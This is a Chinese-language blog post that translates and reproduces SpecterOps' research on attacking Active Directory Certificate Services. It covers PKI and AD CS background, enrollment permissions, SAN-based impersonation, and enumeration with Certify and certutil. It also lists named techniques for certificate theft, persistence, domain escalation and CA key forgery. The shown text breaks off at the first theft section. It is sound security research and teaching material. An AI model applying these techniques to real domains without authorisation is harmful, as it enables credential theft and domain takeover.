---
title: Certified Pre-Owned - Abusing Active Directory Certificate Services
date: 2022-03-15 16:25:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["ADCS", "Active Directory", "Domain Escalation", "Domain Persistence"]
layout: post
---

![](https://s2.loli.net/2022/03/25/mATURgXHhc6YdSt.png)

本篇文章大部分翻译并复现自 Will Schroeder（[@harmj0y](https://twitter.com/harmj0y)）和 Lee Christensen（[@tifkin_](https://twitter.com/tifkin_)）在 2021 年的 BlackHat 大会上所发布的白皮书 [*Certified Pre-Owned - Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)，其中详细介绍了关于 Active Directory Certificate Services 的滥用方法，关于 Active Directory 证书服务的攻击方法第一次系统性的进入我们的视野。

[toc]

## 0.1 摘要

PKI 是一个术语，有些地方会采用中文的表述——公钥基本结构，用来实现证书的产生、管理、存储、分发和撤销等功能。我们可以把他理解成是一套解决方案，这套解决方案里面需要有证书颁发机构，有证书发布，证书撤掉等功能。

Microsoft 实现的 PKI 被称为 Active Directory 证书服务（Active Directory Certificate Services，AD CS），其在很大程度上受到安全社区的关注。 如今，AD CS 被各种组织广泛部署，并为攻击者提供凭据盗窃、机器持久性、域升级和域持久性的新路径。本文介绍了 AD CS 的相关背景，详细介绍了如何通过证书窃取和恶意注册来滥用 AD CS 以实现用户/机器持久性，讨论一组可能导致域权限提升的常见错误配置，并解释了一个通过窃取 Certificate Authority 私钥来伪造 “黄金证书” 的域持久性方法。

## 0.2 介绍

在过去几年中，Active Directory 的安全性引起了安全社区的极大关注。虽然从几个安全角度来看，Active Directory 的各个方面都受到了彻底的关注，但相对容易被忽视的一个领域是 Active Directory 证书服务（AD CS）。 AD CS 是 Microsoft 对 PKI 的实现，它与现有的 Active Directory 森林集成，并提供从加密文件系统到数字签名，再到用户身份验证（本文的重点）等一切功能。虽然默认情况下没有为 Active Directory 环境安装 AD CS，但它如今已被广泛部署在各大企业和组织中。

Specterops 对 AD CS 的研究开始于 Active Directory 技术规范中的一句话：

> *In the case of DCs, the external authentication information that is used to validate **the identity of the client making the bind request comes from the client certificate** presented by the client during the SSL/TLS handshake that occurs in response to the client sending an LDAP_SERVER_START_TLS_OID extended operation*

这导致了一个问题，即 “是否可以使用证书对 LDAP 进行身份验证”。这使 Specterops 了解了 AD CS 以及如何执行基于证书的身份验证，进一步的调查使 Specterops 陷入了试图全面了解 AD CS 组件及其安全影响的境地。

本文旨在尽可能全面地提供有关可能针对 AD CS 攻击的参考资料。从了解 AD CS 工作原理所需的背景开始，包括它与 Active Directory 身份验证的集成，然后进入各种攻击场景。具体来说，我们重点介绍了实现用户/机器持久性的证书窃取和恶意证书注册、一组导致域权限提升的常见证书模板错误配置，以及为了伪造证书而窃取证书颁发机构（Certificate Authority，CA）私钥的方法。

本文简要回顾了 AD CS 的组成部分以及证书注册过程的工作原理。我们讨论已颁发证书及其相关私钥的存储，包括常见文件格式以及 Windows 如何存储它们。这包括关于将 Windows 的数据保护 API（DPAPI）与 Mimikatz 和 SharpDPAPI 等工具集结合使用，以提取证书及其私钥的信息。

本文讨论了攻击者如何利用某些用户/机器证书，通过多种协议对 Active Directory 进行身份验证，这创造了一种迄今为止攻击领域基本上没有意识到的凭据盗窃新形式。此外，本文研究了如何将机器证书窃取与基于资源的约束性委派（RBCD）结合起来，以实现可靠的、长期的机器账户持久性。

除了窃取现有证书之外，本文还研究了攻击者如何为用户和计算机申请或更新证书，并提供与上述相同的持久性方法。虽然使用基于 GUI 的 `mmc.exe` 管理单元和 `certreq.exe` 可以发出请求，但在通过命令和控制通道（C2）操作时满足要求的武器化方法并不存在。因此，Specterops 构建了 [Certify](https://github.com/GhostPack/Certify) 工具集来填补这一空白，Certify 提供了与 AD CS 相关的功能，包括为经过身份验证的用户或机器申请新证书的能力。

然后，本文将测试一组常见的错误配置，这些错误配置在许多案例环境中都见过。自从开始这项研究以来，Specterops 已经针对这些 AD CS 错误配置分析了许多网络环境。到目前为止，几乎在每个网络中，都可以使用其中一种攻击方法来实现域权限提升。本文还讨论了由注册 CA 错误配置导致的变体，以及到 AD CS Web 注册端点的 NTLM Relay 方案。

微软文档中曾有过以下声明，从理论角度验证了本文所要介绍的攻击方法：

> *If the CA private key were compromised, the attacker could perform operations as the CA.*

本文将展示如何使用 SharpDPAPI 和 Mimikatz 工具集来提取 CA 的私钥，然后使用该密钥为域中的任何主体伪造证书。攻击者可以使用这些伪造的证书以域中的任何活动用户或机器的名义进行身份验证，只要 CA 的证书仍然有效且受信任，就不能撤销这些证书。Specterops 还构建了一个名为 [ForgeCert6](https://github.com/GhostPack/ForgeCert) 的工具，用来伪造新的证书，该工具在白皮书发表 45 天后与 Certify 一起发布。

Specterops 在研究中发现了大量滥用 AD CS 的相关技术，并用一个标识符来代指每一种攻击技术，如下表所示。

| Offensive Technique ID |                         Description                          |
| :--------------------: | :----------------------------------------------------------: |
|       **THEFT1**       | Exporting certificates and their private keys using Window’s Crypto APIs |
|       **THEFT2**       |  Extracting user certificates and private keys using DPAPI   |
|       **THEFT3**       | Extracting machine certificates and private keys using DPAPI |
|       **THEFT4**       |   Theft of existing certificates via file/directory triage   |
|       **THEFT5**       | Using the Kerberos PKINIT protocol to retrieve an account’s NTLM hash |
|      **PERSIST1**      | Account persistence via requests for new authentication certificates for a user |
|      **PERSIST2**      | Account persistence via requests for new authentication certificates for a computer |
|      **PERSIST3**      | Account persistence via renewal of authentication certificates for a user/computer |
|        **ESC1**        | Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT |
|        **ESC2**        | Domain escalation via No Issuance Requirements + Enrollable Any Purpose EKU or no EKU |
|        **ESC3**        | Domain escalation via No Issuance Requirements + Certificate Request Agent EKU + no enrollment agent restrictions |
|        **ESC4**        | Domain escalation via misconfigured certificate template access control |
|        **ESC5**        | Domain escalation via vulnerable PKI AD Object Access Control |
|        **ESC6**        | Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CAs + No Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates |
|        **ESC7**        |       Vulnerable Certificate Authority Access Control        |
|        **ESC8**        |              NTLM Relay to AD CS HTTP Endpoints              |
|     **DPERSIST1**      | Domain persistence via certificate forgery with stolen CA private keys |
|     **DPERSIST2**      | Domain persistence via certificate forgery from maliciously added root/intermediate/NTAuth CA certificates |
|     **DPERSIST3**      | Domain persistence via malicious misconfigurations that can later cause a domain escalation |

## 0.3 背景

Microsoft 将 Active Directory 证书服务（AD CS）定义为 “*...the server role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.*”。该服务器角色在 Windows 2000 中引入，并允许以两种配置方案进行部署：作为独立的 CA 或者作为与 AD 集成的企业 CA。如果没有特殊说明，那么本文中介绍的是企业 CA，因为它是最常见的部署方式。PKI 和 AD CS 不是简单的系统，虽然我们将深入讨论它的细节，但我们首先介绍什么是证书、AD CS 的高级组件以及客户端如何在 AD CS 环境中请求证书。

### 0.3.1 证书

证书是 X.509 格式的数字签名文档，用于加密、消息签名或身份验证等功能。证书通常具有多个字段，包括以下部分：

- **Subject**：主题，可以标识证书的所有者。
- **Public Key**：公钥，用于将主题（Subject）与单独存储的私钥相关联。
- **NotBefore** and **NotAfter** dates：定义证书的有效期。
- **Serial Number**：CA 分配的证书标识符。
- **Issuer**：标识颁发证书的人（通常是 CA）。
- **SubjectAlternativeName**：主题备用名称，定义一个或多个可供主题（Subject）使用的可选名称。
- **Basic Constraints**：基本约束，标识证书是 CA 还是最终实体，以及在使用证书时是否存在任何约束。
- **Extended Key Usages (EKUs)**：扩展密钥用法，描述证书将如何使用的对象标识符（OID）。常见的 EKU OID 包括：
  - 代码签名（OID 1.3.6.1.5.5.7.3.3）：证书用于签署可执行代码。
  - 加密文件系统（OID 1.3.6.1.4.1.311.10.3.4）：证书用于加密文件系统。
  - 安全电子邮件（OID 1.3.6.1.5.5.7.3.4）：证书用于加密电子邮件。
  - 客户端身份验证（OID 1.3.6.1.5.5.7.3.2）：证书用于身份验证到另一个服务器。
  - 智能卡登录（OID 1.3.6.1.4.1.311.20.2.2）：证书用于智能卡认证。
  - 服务器认证（OID 1.3.6.1.5.5.7.3.1）：证书用于识别服务器（例如，HTTPS 证书）。
- **Signature Algorithm**：签名算法，指定用于签署证书的算法。
- **Signature**：使用颁发者（例如 CA）的私钥对证书主体进行签名。

证书中包含的信息将用户对象的身份绑定到密钥对。然后，应用程序可以在操作中使用密钥对作为用户身份的证明。

证书颁发机构（Certificate Authority，CA）负责颁发证书。在创建 CA 后，其首先需要创建自己的私钥/公钥对和证书，以便在颁发证书时使用。CA 使用自己的私钥签署新证书来生成自己的根 CA 证书，也就是说根 CA 证书是自签名的。AD CS 会将根 CA 证书的 `Subject` 和 `Issuer` 字段设置为 CA 的名称，将 `Basic Constraints` 设置为 `Subject Type=CA`，并将 `NotBefore/NotAfter` 字段设置为五年（默认情况下）。然后，主机将根 CA 证书添加到其信任库中，从而与 CA 建立信任关系。

AD CS 在 LDAP 容器 ` CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 下的四个位置中定义了 AD 林信任的 CA 证书，每个都因用途而异：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/asGDKZQoEwXUbtu.png)

- **Certification Authorities** 容器定义了受信任的根 CA 证书。这些 CAs 是位于 PKI 信任树层次结构的顶部，是 AD CS 环境中信任的基础。每个 CA 都表示为容器内的一个 AD 对象，其中 `objectClass` 属性被设置为 `CertificationAuthority`，并且 `cACertificate` 属性包含 CA 证书的二进制内容。Windows 将这些 CA 证书传播到每台 Windows 计算机上的受信任的根证书颁发机构证书存储区。为了使 AD 认为证书是可信的，证书的信任链最终必须以该容器中定义的根 CA 之一结束。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/rvJDRmaLF79wIYV.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/fHW2Kwdo9MqX4uE.png)

- **Enrollment Services** 容器定义了每个企业 CA。每个企业 CA 都有一个具有以下属性的 AD 对象：

  - `objectClass` 属性值为 `pKIEnrollmentService`。
  - `cACertificate` 属性值包含 CA 证书的二进制内容。
  - `dNSHostName` 属性设置为 CA 的 DNS 主机（域控）
  - `certificateTemplates` 字段定义了启用的证书模板。证书模板是 CA 在创建证书时使用的设置 “蓝图”，包括 EKU、注册权限、证书到期、颁发要求和加密设置等内容。

  在 AD 环境中，客户端与企业 CA 交互以根据证书模板中定义的设置去申请证书。企业 CA 证书传播到每台 Windows 计算机上的中间证书颁发机构证书存储区。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/KTO5oByPdEIie3Q.png)

- **NTAuthCertificates** 容器定义了有资格颁发身份验证证书的 CA 证书。这个对象的 `objectClass` 属性值为 `certificateAuthority`，并且 `cACertificate` 属性定义了一个可信 CA 证书的二进制数组。加入 AD 的 Windows 机器将这些 CA 证书传播到每台机器上的中间证书颁发机构证书存储区。仅当 NTAuthCertificates 对象定义的 CA 签署了身份验证客户端的证书时，客户端应用程序才能使用证书向 AD 进行身份验证。

- **AIA（Authority Information Access）** 容器保存了中间 CA 证书的 AD 对象。中间 CA 是 PKI 树层次结构中根 CA 的 “子代”，因此，此容器的存在是为了帮助验证证书链。与 Certification Authorities 容器一样，每个 CA 在 AIA 容器中表示为一个 AD 对象，其中 `objectClass` 属性设置为 CertificationAuthority，并且 `cACertificate` 属性包含 CA 证书的二进制内容。当有新的 CA 安装时，它的证书则会自动放到 AIA 容器中。这些 CAs 传播到每台机器上的中间证书颁发机构证书存储区。

要从 AD CS 获取证书，客户端需要经过⼀个称为注册的过程。概括地说，在注册期间，客户端首先根据前文讨论的 Enrollment  Services 容器中的对象找到企业 CA。然后，客户端生成一个公钥/私钥对，并将公钥、证书主题和证书模板名称等其他详细信息一起放入证书签名请求（CSR）消息中。然后，客户端使用其私钥签署 CSR，并将 CSR 发送到企业 CA 服务器。CA 服务器检查客户端是否可以请求证书。如果是，它会通过查找 CSR 中指定的证书模板 AD 对象来确定是否会颁发证书。CA 将检查证书模板 AD 对象的权限是否允许该账户获取证书。如果是，CA 将使用证书模板定义的 “蓝图” 设置（例如，EKU、加密设置和颁发要求等）并使用 CSR 中提供的其他信息（如果证书的模板设置允许）生成证书。CA 使用其私钥签署证书，然后将其返回给客户端。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/wTzhCQOfIlK6rmE.png)

CA 颁发的证书可以提供加密（例如，加密⽂件系统）、数字签名（例如，代码签名）和身份验证（例如，对 AD）等服务。本文将主要关注启用 AD 身份验证的证书，但请记住，攻击者可以滥用证书，而不仅仅是身份验证。

### 0.3.2 证书模板

AD CS 企业 CA 颁发的证书应用了证书模板定义的 “蓝图” 设置。这些模板是注册策略和预定义证书设置的集合，包含诸如 “此证书有效期为多久？”、“证书用于什么？”、“如何指定证书的主题？”、“谁可以申请证书？”，以及许多其他设置。如下图所示，通过证书模板控制台 MMC 管理单元 `certtmpl.msc` 可以编辑证书模板：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/yfF91qxvonO8Gul.png)

AD CS 将可用的证书模板存储为 AD 对象，其 `objectClass` 属性为 `pKICertificateTemplate`，位于以下容器中：

```cmd
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>
```

证书模板对象的属性定义了它的设置，它的安全描述符控制了哪些主体可以在证书中注册或编辑证书模板。证书模板对象中的 `pKIExtendedKeyUsage` 属性包含在模板中启用的 OID 数组。 这些 EKU OID 会影响证书的用途，包括加密文件系统（OID 1.3.6.1.4.1.311.10.3.4）、代码签名（OID 1.3.6.1.5.5.7.3.3）、智能卡登录等内容（OID 1.3.6.1.4.1.311.20.2.2）、客户端身份验证（OID 1.3.6.1.5.5.7.3.2）等。 PKI 解决方案对 Microsoft 提供的 EKU OID 进行了细分。

本文所讨论的研究就主要集中在 EKU，当特定的 EKU 出现在证书中时，该证书允许被用于对 AD 进行身份验证。根据 Specterops 的研究，拥有以下 OID 的证书可以用于身份验证：

|          Description          |          OID           |
| :---------------------------: | :--------------------: |
|     Client Authentication     |   1.3.6.1.5.5.7.3.2    |
| PKINIT Client Authentication* |    1.3.6.1.5.2.3.4     |
|       Smart Card Logon        | 1.3.6.1.4.1.311.20.2.2 |
|          Any Purpose          |      2.5.29.37.0       |
|             SubCA             |       (no EKUs)        |

>  默认情况下，AD CS 部署中不存在 OID 1.3.6.1.5.2.3.4，因此需要手动添加，但它确实适用于客户端⾝份验证。

此外，Specterops 发现可以滥用的另一个 EKU OID 是证书请求代理 OID 1.3.6.1.4.1.311.20.2.1。除非设置了特定限制，否则具有此 OID 的证书可用于代表其他用户申请证书。

在证书模板控制台中，EKU 可以在模板的 “属性” → “扩展” → “应用程序策略” 下进行设置，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/X2NxDWTgwlvCHyu.png)

### 0.3.3 证书注册

#### 0.3.3.1 注册权限

用户不一定要从每个定义的证书模板中获取证书。网络管理员首先创建证书模板，然后企业 CA 发布该模板，使客户可以注册。回想一下，AD CS 在 AD 中将企业 CA 注册为 `objectClass` 属性为 `pKIEnrollmentService` 的对象。AD CS 通过将模板的名称添加到对象的 `certificateTemplates` 属性来指定在企业 CA 上所启用的证书模板：

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/vtWrepFZD2s7TEx.png)

AD CS 使用两个安全描述符定义注册权限：一个在证书模板 AD 对象上，另一个在企业 CA 本身上。

对于证书模板，模板的 DACL 中的以下 ACE 可能会导致主体具有注册权限：

-  ACE 为主体授予证书注册（Certificate-Enrollment）扩展权限。这个 ACE 授予主体 `RIGHT_DS_CONTROL_ACCESS` 访问权限，其中 `ObjectType` 设置为 `0e10c968-78fb-11d2-90d4-00c04f79dc55`。此 GUID 对应于 Certificate-Enrollment 权限。
-  ACE 为主体授予证书自动注册 （Certificate-AutoEnrollment）扩展权限。这个 ACE 授予主体 `RIGHT_DS_CONTROL_ACCESS` 访问权限，其中 `ObjectType` 设置为 `a05b8cc2-17bc-4802-a710-e7c15ab866a2`。此 GUID 对应于 Certificate-AutoEnrollment 扩展权限。
-  ACE 为主体授予所有扩展（ExtendedRights）权限。这个 ACE 启用 `RIGHT_DS_CONTROL_ACCESS` 访问权限，其中 `ObjectType` 设置为 `00000000- 0000-0000-0000-000000000000`。此 GUID 对应于 ExtendedRights 权限。
-  ACE 为主体授予完全控制（FullControl/GenericAll）权限。这个 ACE 启用 FullControl/GenericAll 访问权限。

执行以下命令，查看指定主体对指定证书模板所拥有的 ACE，如下图所示。

```powershell
Import-Module ActiveDirectory
cd AD:
$Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com'
$Acl.Access.Count
$Acl.Access | where IdentityReference -match 'Domain Users'
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/EdFfRW7r2vQVahc.png)

管理员可以通过证书模板控制台 `certtmpl.msc` 配置证书模板权限，方法是右键点击 “模板”，选择 “属性”，然后查看 “ 安全” 选项卡，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/vbPnd1GAgQo5KSu.png)

此外，企业 CA 也使用安全描述符定义注册权限，并可以取代证书模板定义的任何注册权限。企业 CA 上配置的安全描述符定义了这些权限，可以在证书颁发机构 MMC 管理单元 `certsrv.msc` 中查看，方法是右键单击选中的 CA，选择 “属性”，然后查看 “ 安全” 选项卡，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/yI9zC1hWYHkaJ3u.png)

所有的这些安全设置都将在 CA 服务器上的注册表 `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA NAME>` 中设置键值 `Security` 。

#### 0.3.3.2 注册方式

如果企业 CA 和证书模板的安全描述符都授予客户端证书注册权限，则客户端可以请求证书。客户端可以根据 AD CS 环境的配置以不同放式请求证书：

1. 使用 Windows 客户端证书注册协议（MS-WCCE），这是一组分布式组件对象模型（DCOM）接口，可与包括注册在内的各种 AD CS 功能进行交互。DCOM 服务器默认在所有 AD CS 服务器上启用，这也是客户端申请证书的最常用方法。
2. 通过 ICertPassage 远程协议（MS-ICPR），一种可以在命名管道或 TCP/IP 上运行的 RPC 协议。
3. 访问证书注册 Web 界面。要使用此功能，AD CS 服务器需要安装并配置 “证书颁发机构 Web 注册” 角色。启用后，用户可以导航到 `http://<ADCSSERVER>/certsrv/`，以访问 AD CS 服务器上通过 IIS 托管的 ASP Web 注册应用程序。
4. 与证书注册服务（CES）交互。要使用此功能，服务器需要安装 “证书注册 Web 服务” 角色。启用后，用户可以通过 `https://<CESSERVER>/<CANAME>_CES_Kerberos/service.svc` 访问 Web 服务以请求证书。此服务与证书注册策略（CEP）服务（通过证书注册策略 Web 服务角色安装）协同工作，客户端使用该服务在 URL `https://<CEPSERVER>/ADPolicyProvider_CEP_Kerberos/service.svc` 中列出证书模板。
5. 使用网络设备注册服务。要使用它，服务器需要安装 “网络设备注册服务” 角色，它允许客户端（即网络设备）通过简单证书注册协议（SCEP）获取证书。启用后，管理员可以在 URL `http://<NDESSERVER>/CertSrv/mscep_admin/` 中获取一次性密码（OTP）。然后管理员可以将 OTP 提供给网络设备，该设备将使用 SCEP 通过 URL `http://NDESSERVER/CertSrv/mscep/` 请求证书。

在 Windows 机器上，用户可以使用 GUI 请求证书，方法是启动 `certmgr.msc`（用于申请用户证书）或 `certlm.msc`（用于申请计算机证书），右键单击 “个人”，选择 “所有任务”，选择 “申请新证书”，如下图所示。这将为用户提供企业 CA 已发布的、当前用户可用的证书模板。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/7ILoSfvqmpkDXJB.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/pRWr7byhGTgVsi9.png)

单击 “注册” 按钮后，Windows 将申请证书（默认情况下，使用实现 MS-WCCE 的 COM 对象），然后证书将出现在 “个人” 下的 “证书” 中，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/ZU7lpiH6L3udf8R.png)

在企业 CA 方面，证书颁发机构 MMC 管理单元 `certsrv.msc` 中，将在 “颁发的证书” 下面显示已颁发的证书，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/36nG4ACFHwuXY9g.png)

还可以使用内置的 `certreq.exe` 命令或 PowerShell 的 `Get-Certificate` Cmdlet 进行证书注册。在非 Windows 机器上，客户端可以使用基于 HTTP 的接口来申请证书。

CA 颁发证书后，可以通过 `certsrv.msc` 吊销颁发的证书。默认情况下，AD CS 使用证书吊销列表（CRL）分发吊销的证书信息，它们基本上只是每个被撤销证书的序列号的列表。

#### 0.3.3.3 发布要求

除了证书模板和企业 CA 访问控制限制之外，我们还可以看到用于控制证书注册的两个证书模板设置，这些被称为发布要求（Issuance Requirements），如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/KzgNLIMCZinv6sc.png)

第一个限制被称作 “CA 证书管理程序批准(C)”（CA certificate manager approval），开启开选项后，会在证书模板 AD 对象的 `msPKI-Enrollment-Flag` 属性上设置 `CT_FLAG_PEND_ALL_REQUESTS` (0x2) 位。这会将基于该模板的所有证书注册请求置于待处理状态（Pending Requests，在 certsrv.msc 的 “挂起的申请” 部分中可见），这需要证书管理员在颁发证书之前予以批准或拒绝，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/LfHIMZYaBVq2UGu.png)

#### 0.3.3.4 注册代理、授权签名和应用程序策略

发布要求中显示的第二组限制是 “授权签名的数量(H)”（This number of authorized signatures）和 “应用程序策略”（Application Policy）。前者要求证书请求（CSR）在证书被颁发之前由现有的授权证书进行数字签名，该设置就定义了 CSR 中 CA 接受的签名数量。后者定义了颁发证书所需的签名证书必须具有的 EKU OID。

这些设置的常见用途是注册代理（Enrollment Agents）。注册代理是一个 AD CS 术语，其授予可以代表其他用户请求证书的实体。为此，CA 必须向注册代理帐户颁发至少包含证书请求代理 EKU（OID 1.3.6.1.4.1.311.20.2.1）的证书。 一旦颁发，注册代理就可以代表其他用户签署 CSR 并请求证书。而前面所说的 “授权签名的数量(H)” 就指定了在 CA 考虑颁发证书之前，注册代理必须签署 CSR 的数量是多少。

#### 0.3.3.5 主题备用名称和身份验证

主题备用名称（Subject Alternative Names，SAN）是 X.509v3 扩展，其可以作为证书的所有者。添加到证书时，它允许将其他身份绑定到证书，而不仅仅是证书的主题。SAN 的一个常见用途是为 HTTPS 证书提供额外的主机名。例如，如果 Web 服务器托管多个域的内容，则每个适用的域都可以包含在 SAN 中，这样 Web 服务器只需要一个 HTTPS 证书，而不是每个域一个 HTTPS 证书。

这对于 HTTPS 证书来说很好，但是当与允许域身份验证的证书结合使用时，可能会出现危险的情况。默认情况下，在基于证书的身份验证期间，AD 的一种方式是根据 SAN 中指定的 UPN 将证书映射到用户帐户。如果攻击者在请求具有启用客户端身份验证的 EKU 的证书时可以指定任意 SAN，并且 CA 使用攻击者提供的 SAN 创建和签署证书，则攻击者可以成为域中的任何用户。例如，如果攻击者可以请求具有域管理员 SAN 字段的客户端身份验证证书，并且 CA 颁发该证书，则攻击者可以以该域管理员身份进行身份验证。

各种 AD CS 错误配置可能允许非特权用户在证书注册中提供任意 SAN，从而导致域升级场景。本文将在 “域权限提升” 部分探讨这些场景。

#### 0.3.3.6 Kerberos 身份验证和 NTAuthCertificates AD 容器

AD 默认支持两种协议的证书身份验证：Kerberos 协议和安全信道（Secure Channel，Schannel）。对于 Kerberos 协议，技术规范 “[MS-PKCA]: Public Key Cryptography for Initial  Authentication (PKINIT) in Kerberos Protocol” 中定义了身份验证过程。[`@_EthicalChaos_`](https://twitter.com/_EthicalChaos_) 在他们关于智能卡的文章[*Attacking Smart Card Based Active Directory Networks*](https://ethicalchaos.dev/2020/10/04/attacking-smart-card-based-active-directory-networks/)中很好地概述了 PKINIT，下面是这个过程的简要概述。

用户将使用其证书的私钥对 TGT 请求（AS_REQ）中的 Authenticator 字段进行签名，并将此请求提交给域控制器。如果一切顺利，域控制器会执行一系列验证步骤并给出 TGT。微软的智能卡文档详细地介绍了这些步骤：

> *The KDC validates the user's certificate (time, path, and revocation status) to  ensure that the certificate is from a trusted source. The KDC uses CryptoAPI to  build a certification path from the user's certificate to a root certification authority (CA) certificate that resides in the root store on the domain controller.  The KDC then uses CryptoAPI to verify the digital signature on the signed  authenticator that was included in the preauthentication data fields. The  domain controller verifies the signature and uses the public key from the user's  certificate to prove that the request originated from the owner of the private key that corresponds to the public key. **The KDC also verifies that the issuer is  trusted and appears in the NTAUTH certificate store.***

这里提到的 “NTAUTH certificate store” 就是指 AD CS 安装在以下位置的 `NTAuthCertificates` AD 对象：

```cmd
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>
```

微软官方解释了这个 AD 对象的意义：

> *By publishing the CA certificate to the Enterprise NTAuth store, the  Administrator indicates that the CA is trusted to issue certificates of these types.  Windows CAs automatically publish their CA certificates to this store.*

在证书身份验证期间，DC 可以检查身份验证证书是否链接到由 `NTAuthCertificates` 对象定义的 CA 证书，因此可以认为 `NTAuthCertificates` 对象中的 CA 证书必须依次链接到根 CA，`NTAuthCertificates` 对象是 Active Directory 中证书身份验证的信任根。

#### 0.3.3.7 Secure Channel 身份验证

Secure Channel（Schannel）是 Windows 在建立 TLS/SSL 连接时利用的 SSP。Schannel 支持客户端身份验证（以及许多其他功能），使远程服务器能够验证连接用户的身份。它使用 PKI 完成此操作，证书是主要凭据。在 TLS 握手期间，服务器要求客户端请提供证书以进行身份验证。客户端先前已从服务器信任的 CA 颁发客户端身份验证证书，然后将其证书发送到服务器。然后，服务器验证证书是否正确，并在一切正常的情况下授予用户访问权限。Comodo 在他们的博客文章 [*What is SSL/TLS Client Authentication? How does it work?*](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html) 上对这个过程进行了简单的概述。

当帐户使用证书向 AD 进行身份验证时，DC 需要以某种方式将证书凭据映射到 AD 帐户。Schannel 首先尝试使用 Kerberos 的扩展协议 S4U2Self 将凭据映射到用户帐户。如果不成功，它将尝试使用证书的 SAN 扩展、主题和颁发者字段的组合或仅从颁发者将证书映射到用户帐户。

默认情况下，AD 环境中没有多少协议支持通过 Schannel 开箱即用的 AD 身份验证。WinRM、RDP 和 IIS 都支持使用 Schannel 的客户端身份验证，但它需要额外的配置，并且在某些情况下（如 WinRM）不与 Active Directory 集成。令一种通常有效的协议是 LDAPS（又名 LDAP over SSL/TLS）。事实上，发起这项研究的是从 AD 技术规范（MS-ADTS）中了解到，甚至可以对 LDAPS 进行客户端证书身份验证。

根据经验，似乎没有多少工具利用 LDAPS 的客户端证书身份验证。[Get-LdapCurrentUser](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1) 这个 Cmdlet 演示了如何使用 .NET 库向 LDAP 进行身份验证。该 Cmdlet 执行 LDAP “Who am I?” 显示当前验证用户的扩展操作，如下图所示。

![image-20230224181503135](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/image-20230224181503135.png)

### 0.3.4 AD CS 的枚举

如果想要枚举企业 CA 及其设置，可以以 `CN=Configuration,DC=<DOMAIN>,DC=<COM>` 为 BaseDN，以 `(objectCategory=pKIEnrollmentService)` 为过滤器查询 LDAP。结果将识别 CA 服务器的 DNS 主机名、CA 名称本身、证书开始和结束日期、各种标志、已发布的证书模板等各种属性信息。

Certify 可以枚举有关 AD CS 环境的有用配置和基础结构信息，使用其 `cas` 命令可以枚举受信任的根 CA 证书、由 `NTAuthCertificates` 对象定义的证书以及有关企业 CA 的各种信息：

```console
C:\Users\Marcus\Desktop> Certify.exe cas
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Wu1zAix5JPNSonI.png)

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/a9VhTUHE6LkJrtc.png)

此外，使用 `certutil.exe` 的 `-TCAInfo` 参数可以枚举企业 CA，相关命令如下，执行结果如下图所示。

```console
C:\Users\Marcus\Desktop> certutil.exe -TCAInfo
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/8cUnrOyzqoTgQAP.png)

证书模板在活动目录中是 `pKICertificateTemplate` 的子类，并存储模板的配置数据。企业 CA 通过将模板的名称添加到企业 CA 的 AD 对象的 `certificateTemplates` 属性中来发布一个模板，使其可供客户端注册。使用 Certify 的 `find` 命令，可以枚举企业 CA 并返回每个发布的证书模板的详细信息。

```console
C:\Users\Marcus\Desktop> Certify.exe find
```

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/5S1jKUZbwAy4Oad.png)

此外，`certutil.exe -TCAInfo` 命令的输出包括每个企业 CA 已发布的证书模板，要获取有关每个可用证书模板的详细信息，可以使用 `certutil -v -dstemplate` 命令，如下图所示。

![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Q6PL4T3VZDvdpMm.png)

## 0.4 证书窃取

如果一个组织中安装并配置了 AD CS，则必定有一些 AD 用户或计算机可能具有颁发给他们的证书，并且其中一些证书可能具有允许域身份验证的 EKU。许多组织选择使用操作系统本身存储密钥的默认设置，在这种情况下，Windows 使用数据保护应用程序编程接口（DPAPI）来保护密钥材料。

### 0.4.1 Exporting Certificates Using the Crypto APIs – THEFT1

